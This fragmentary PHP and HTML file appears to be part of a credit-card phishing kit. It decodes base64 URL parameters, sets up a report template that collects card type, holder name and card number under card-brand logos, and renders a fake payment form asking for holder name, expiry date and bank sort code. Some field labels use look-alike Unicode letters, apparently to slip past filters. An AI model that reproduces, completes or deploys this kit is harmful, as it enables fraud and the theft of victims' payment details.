<?php
$fname = base64_decode($_GET['_Fullf']);
$fname1 = base64_decode($_GET['_Fulll']);
...
#################################
     <img src='http://www.credit-card-logos.com/images/visa_credit-card-logos/visa_mastercard_1.gif'/>
#################################
Type Of CC  : $cctype
Holder Name : $hlr
Card Number : $ccnum
...
<div class="prfSection" id="cc">
	...
	<div class="prfDetails confidential"><input pattern="[a-zA-Z-']+.{6,40}" style="letter-spacing: 2px;" title="Please enter a valid Card Holder"  type="text" id="chldr"  name="chldr" class="large" value="<?=base64_decode($_GET['_Full']);?>" required/></div><br></br></br>
...
<option selected value>Μonth</option>
...
<option selected value>Yеar</option>
...
<input title="Please enter Your Sort Code" Placeholder="xx-xx-xx" type="text" id="password" name="password" class="password" value="" />&nbsp;&nbsp;<img id="3d-image" src="img/3d/none.png" style="margin-bottom: -9px;" width="65px"></div>
	</div>
<br></br></br>
